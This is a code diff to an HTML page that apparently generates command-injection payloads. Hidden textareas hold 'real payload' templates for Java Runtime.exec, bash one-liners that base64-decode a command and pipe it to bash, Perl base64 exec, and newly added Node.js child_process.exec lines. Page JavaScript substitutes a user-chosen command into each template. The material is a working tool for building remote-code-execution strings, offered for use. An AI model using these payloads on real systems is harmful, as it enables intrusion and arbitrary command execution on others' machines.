@@ -31,12 +31,13 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd"});
 如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
 
 🔥实际payload for Linux【成功率很高】 支持Linux 不支持macOS
-/bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash</textarea>
+/bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash
 
 
 🔥实际payload    注意: 如果传入的字符串 里有 & _ < > | 符号时, 可能不会执行成功!
 /bin/bash -c $@|bash 0 arr0w1_cmd
 /bin/bash -c $*|bash 0 arr0w1_cmd
+</textarea>
 
     <textarea id="data3" hidden="true">
 
@@ -49,6 +50,11 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd"});
 perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
 
     <textarea id="data4" hidden="true">
+如
+require('child_process').exec('echo \'asd\' > ~/Downloads/11111.txt');//
+
+🔥实际payload
+require('child_process').exec('arr0w1_cmd');//
 </textarea>
 
     <textarea id="data5" hidden="true">
@@ -100,8 +106,8 @@ perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
 
             <br>
             <br>
-            4
-            <p class="font-weight-bold">temp </p>
+            4 node.js
+            <p class="font-weight-bold"> exec </p>
             <textarea id="payload4" class="form-control" rows="3"></textarea>
 
             <br>
@@ -193,7 +199,7 @@ perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
 
         document.getElementById("payload3").value = data3.replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
 
-        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd.replace(/\'/g,"\\'") );
 
         document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
